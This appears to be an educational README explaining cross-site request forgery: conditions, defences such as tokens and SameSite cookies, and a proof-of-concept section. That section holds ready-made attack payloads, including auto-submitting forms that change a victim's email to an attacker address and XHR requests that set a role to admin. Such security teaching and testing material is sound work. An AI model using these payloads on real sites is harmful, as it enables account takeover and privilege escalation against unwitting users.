# Cross-Site-Request-Forgery-Explained
> Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.

## Summary
- [Methodology](#methodology)
  - [What is the impact of CSRF?](#What-is-the-impact-of-CSRF?)
  - [When does CSRF work?](#When-does-CSRF-work?)
  - [Common CSRF defenses](#Common-CSRF-defenses)
  - [CSRF Cheat Sheet](#CSRF-Cheat-Sheet)
  - [Proof-of-Concept Attacks](#Proof---of---Concept-Attacks)
- [Tools](#tools)
- [References](#references)
- [Resources](#resources)
- [Labs](#Labs)

## Methodology
### What is the impact of CSRF?
CSRF can make a user do actions they didn’t mean to.
**Examples:**
- Change account email
- Change password
- Transfer money
If the user is an admin, the attacker might control the whole website.

### When does CSRF work?
CSRF works only if these things exist:

**1. Sensitive action**

There is an action worth attacking.

**Example:**

Changing email or password.

**2. Cookie-based login**

The website trusts only the session cookie.

Example:

If the cookie is valid → the request is accepted.

**3. No secret parameters**

The request doesn’t need anything the attacker can’t guess.

**Example:**

No old password, no random token.

**CSRF Example**
Normal request
```
POST /email/change
email=user@example.com
```
The site changes the email because the cookie is valid.

**Attacker page**
```
<form action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
  document.forms[0].submit();
</script>
```
**What happens to the victim?**
1. Victim is logged in
2. Victim opens attacker website
3. Browser sends the request with the cookie
4. Website trusts it
5. Email gets changed without user knowing

### **Common CSRF defenses**
> Most CSRF bugs today require bypassing protections.

**1. CSRF Tokens**
A CSRF token is a secret random value sent by the server.

How it helps:
- Every sensitive request must include the correct token
- Attacker can’t guess it

**2. Referer Header Validation**
Some apps check the Referer header.

Example:
- Request must come from the same domain
- If not → rejected
  
This is weaker than CSRF tokens and can sometimes be bypassed.

**3. SameSite Cookies**
SameSite controls when cookies are sent in cross-site requests.

Example:

- If SameSite is set correctly
- Browser won’t send session cookies from another site
  
### **SameSite values**
---

**1. SameSite=None**

Meaning:

Cookies are sent in all requests, even from other websites.

Conditions:
- Must be used with ``Secure``
- Works only over HTTPS

Example:
```
Set-Cookie: session=abc123; SameSite=None; Secure
```
CSRF status: ✅ Vulnerable

**2. SameSite=Lax (Default)**

Meaning:

Cookies are sent only in:
- Normal navigation (GET)
- Top-level requests
  
Example:
```
Set-Cookie: session=abc123; SameSite=Lax
```

**What is allowed?**

- Clicking a link
- Opening a URL directly

**What is blocked?**

- POST from another site
- Hidden forms
- AJAX cross-site requests

**CSRF status:**

- POST-based CSRF blocked
- GET-based CSRF may still work

**3. SameSite=Strict**

Meaning:

Cookies are sent only if the request comes from the same site.

Example:
```
Set-Cookie: session=abc123; SameSite=Strict
```

**Impact:**

- Even clicking a link from another site won’t send cookies
- Strong protection

CSRF status: Fully protected

### CSRF Cheat Sheet
![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)
The Cross-Site Request Forgery (CSRF) Cheat Sheet is a flowchart that is designed to cover the common scenarios that you would test for in CSRF testing.

### Proof-of-Concept Attacks

#### HTML GET - Requiring User Interaction

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

#### HTML GET - No User Interaction

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

#### HTML POST - Requiring User Interaction

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

#### HTML POST - AutoSubmit - No User Interaction

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

#### HTML POST - multipart/form-data With File Upload - Requiring User Interaction

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

#### JSON GET - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

#### JSON POST - Simple Request

With XHR :

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

#### JSON POST - Complex Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## Tools

* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.

## References

* [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
* [Cross-Site Request Forgery (CSRF) - OWASP - Apr 19, 2024](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton - July 26, 2015](https://whitton.io/articles/messenger-site-wide-csrf/)
* [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial - 19 July 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
* [Hacking PayPal Accounts with one click (Patched) - Yasser Ali - 2014/10/09](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
* [Add tweet to collection CSRF - Vijay Kumar (indoappsec) - November 21, 2015](https://hackerone.com/reports/100820)
* [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd - October 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
* [How I Hacked Your Beats Account? Apple Bug Bounty - @aaditya_purani - 2016/07/20](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
* [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - July 2, 2017](https://hackerone.com/reports/245346)
* [Hacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjkovic - January 15th, 2018](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
* [Cross Site Request Forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
* [Cross-Site Request Forgery Attack - PwnFunction - 5 Apr. 2019](https://www.youtube.com/watch?v=eWEgUcHPle0)
* [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
* [Bypass Referer Check Logic for CSRF - hahwul - Oct 11, 2019](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)

## Resources
- [PayloadsAllTheThings/Cross-Site Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery)
- [PortSwigger Academy](https://portswigger.net/web-security/csrf)
- [NahamSec Course](https://app.hackinghub.io/course)
- [ChatGPT](https://chatgpt.com/)
  
## Labs

* [PortSwigger - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [PortSwigger - CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [PortSwigger - CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [PortSwigger - CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [PortSwigger - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [PortSwigger - CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [PortSwigger - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [PortSwigger - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)











